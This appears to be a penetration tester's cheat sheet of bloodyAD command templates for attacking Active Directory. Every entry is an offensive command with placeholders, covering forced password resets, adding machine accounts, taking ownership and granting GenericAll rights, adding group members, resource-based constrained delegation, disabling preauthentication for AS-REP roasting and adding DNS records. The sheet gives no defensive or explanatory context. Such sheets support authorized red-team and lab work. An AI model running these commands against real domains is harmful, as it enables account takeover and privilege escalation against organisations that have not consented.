# bloodyad
#target/remote #os/linux #cat/ad

## bloodyad get writable
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> get writable --partition DOMAIN
```

## bloodyad set password
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> set password '<target_obj>' '<new_password|Password123!>'
```

## bloodyad add computer
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add computer '<computer_name|PENTEST>' '<new_password|Password123!>'
```

## bloodyad set owner
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> set owner '<target_obj>' <principal>
```

## bloodyad add genericall
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add genericAll '<target_obj>' <principal>
```

## bloodyad add groupmember
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add groupMember '<target_obj>' <principal>
```

## bloodyad set object
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> set object '<target_obj>' <attribute> -v <value>
```

## bloodyad targeted asreproast
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add uac '<target_obj>' -f DONT_REQ_PREAUTH
```

## bloodyad add rbcd
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add rbcd '<target_obj>' <principal>
```

## bloodyad enable account
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> remove uac '<target_obj>' -f ACCOUNTDISABLE
```

## bloodyad add dns record
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add dnsRecord <record_name> <record_data>
```

## bloodyad abuse writeowner
```
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> set owner '<target_obj>' <principal>
bloodyAD --host <dc_fqdn> -d <domain> -u '<user>' <auth> add genericAll '<target_obj>' <principal>
```
